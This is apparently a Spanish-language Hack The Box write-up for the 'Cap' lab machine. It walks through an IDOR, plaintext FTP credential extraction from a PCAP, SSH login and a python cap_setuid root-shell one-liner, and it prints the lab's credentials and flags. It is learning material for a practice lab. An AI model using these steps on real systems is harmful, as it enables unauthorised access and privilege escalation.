# INFORME - HACK THE BOX: CAP

## Resumen de la Máquina

| Campo | Detalle |
|-------|---------|
| **Nombre** | Cap |
| **Dificultad** | Easy |
| **IP** | 10.129.69.128 |
| **SO** | Ubuntu 20.04.2 LTS (Kernel 5.4.0-80-generic) |
| **Puntos** | 20 |

---

## FASE 1: RECONOCIMIENTO

### Escaneo de Puertos (Nmap)
```
nmap -sS -sV -sC -O -p- --min-rate=1000 10.129.69.128
```

| Puerto | Servicio | Versión |
|--------|----------|---------|
| 21/tcp | FTP | vsftpd 3.0.3 |
| 22/tcp | SSH | OpenSSH 8.2p1 Ubuntu |
| 80/tcp | HTTP | Gunicorn (Python Flask) |

**Sistema Operativo**: Linux 5.0 - 5.14 (Ubuntu)

### Enumeración Web
- Aplicación Flask/Gunicorn: "Security Dashboard"
- Endpoints descubiertos:
  - `/` - Dashboard principal
  - `/capture` - Captura de tráfico (5 segundos PCAP)
  - `/ip` - Configuración IP (ejecuta `ifconfig`)
  - `/netstat` - Estado de red (ejecuta `netstat`)
  - `/data/<id>` - Visualización de datos de captura
  - `/download/<id>` - Descarga de PCAP

**Nombre de usuario descubierto en el dashboard**: `nathan`

---

## FASE 2: ENUMERACIÓN

### IDOR (Insecure Direct Object Reference)
El endpoint `/data/<id>` utiliza IDs secuenciales sin verificación de propiedad. Se accedió exitosamente a `/data/0` que contenía una captura de tráfico interno.

```
curl -s -o /dev/null -w '%{http_code}' "http://10.129.69.128/data/0"
→ HTTP 200 (Acceso permitido sin autenticación)
```

### Análisis del PCAP 0
Descargado vía `/download/0` y analizado con `tshark`:

```
tshark -r /tmp/pcap_0.pcap -Y "ftp.request.command" -T fields -e ftp.request.command -e ftp.request.arg
```

**Resultado**: Tráfico FTP en texto plano con credenciales:
```
USER  nathan
PASS  Buck3tH4TF0RM3!
```

---

## FASE 3: EXPLLOTACIÓN

### Vector de Ataque: IDOR → Credential Theft → SSH

**Paso 1 - IDOR**: Acceso no autorizado a PCAP del usuario `nathan`
```bash
curl -s "http://10.129.69.128/download/0" -o /tmp/pcap_0.pcap
```

**Paso 2 - Extracción de credenciales**: FTP en texto plano expuesto en el PCAP
```
tshark -r /tmp/pcap_0.pcap -Y "ftp" → Credenciales: nathan:Buck3tH4TF0RM3!
```

**Paso 3 - Acceso inicial**: Login SSH exitoso
```bash
ssh nathan@10.129.69.128
# Password: Buck3tH4TF0RM3!
```

**User Flag obtenida**: `e89034ea38903a6a6c93ac562bb8776b`

---

## FASE 4: POST-EXPLITACIÓN - ESCALADA DE PRIVILEGIOS

### Hallazgo: Linux Capabilities en Python
```
getcap -r / 2>/dev/null
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

### Explotación de `cap_setuid`
La capability `cap_setuid` permite a un proceso cambiar su UID efectivo a cualquier valor, incluyendo UID 0 (root).

```bash
python3.8 -c "import os; os.setuid(0); os.system('/bin/bash')"
```

**Resultado**:
```
uid=0(root) gid=1001(nathan) groups=1001(nathan)
```

**Root Flag obtenida**: `d4ea5cd0deb7efeb95eaadd3d0dc12ee`

---

## FLAGS

| Flag | Valor |
|------|-------|
| **user.txt** | `e89034ea38903a6a6c93ac562bb8776b` |
| **root.txt** | `d4ea5cd0deb7efeb95eaadd3d0dc12ee` |

---

## Cadena de Ataque Completa

```
Nmap Scan
  → Puerto 80 (Gunicorn Flask App)
    → IDOR en /data/<id>
      → Descarga PCAP 0
        → Credenciales FTP en texto plano
          → SSH como nathan
            → cap_setuid en /usr/bin/python3.8
              → os.setuid(0) → ROOT
```

---

## Lecciones Aprendidas

1. **IDOR es una vulnerabilidad crítica**: Siempre fuzzear IDs secuenciales cuando se detectan en URLs (`/data/1`, `/data/2`...). Probar `/data/0`, `/data/-1`, y otros valores.

2. **FTP expone credenciales**: FTP transmite todo en texto plano. Si se captura tráfico FTP (vía PCAP, MITM, o sniffing), las credenciales se obtienen sin esfuerzo.

3. **Linux Capabilities son una superficie de ataque**: `getcap -r /` debe ejecutarse siempre durante la enumeración de post-explotación. `cap_setuid` en cualquier intérprete (Python, Perl, Ruby) equivale a acceso root completo.

4. **Reutilización de contraseñas**: Las credenciales de FTP funcionaron para SSH, demostrando el peligro del reutilización de contraseñas.

5. **El nombre es la pista**: "Cap" hace referencia tanto a las capturas de paquetes (packet captures) como a las Linux capabilities, ambas centrales para resolver la máquina.




---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[../comandos/Tmux.md|Tmux]] — Escalada de Privilegios, Metasploit, Wireshark
- [[../comandos/Telnet.md|Telnet]] — Escalada de Privilegios, SSH, Wireshark
- [[../apuntes Chema/Wireshark.md|Wireshark]] — Metasploit, SSH, Wireshark
- [[Informe_Banco.md|Informe_Banco]] — Metasploit, SSH, Wireshark
- [[../apuntes Chema/OWASP API Top 10 Labs.md|OWASP API Top 10 Labs]] — Escalada de Privilegios, IDOR, Metasploit
- [[../apuntes Andres/15.06.2026 Repaso Semanal II Archetype Completa, SMB y Primera Máquina Windows.md|15.06.2026 Repaso Semanal II Archetype Completa, SMB y Primera Máquina Windows]] — Escalada de Privilegios, IDOR, Metasploit

### 🛠️ Herramientas

- [[comandos/Metasploit|Metasploit]]
- [[comandos/Nmap|Nmap]]
- [[comandos/SSH|SSH]]
- [[comandos/Telnet|Telnet]]
- [[comandos/Tmux|Tmux]]

### 🎯 Vulnerabilidades Relacionadas


> #escalada-privilegios #hack-the-box #idor #linux #metasploit #nmap #post-explotacion #redes #ssh #telnet #tmux #windows #wireshark
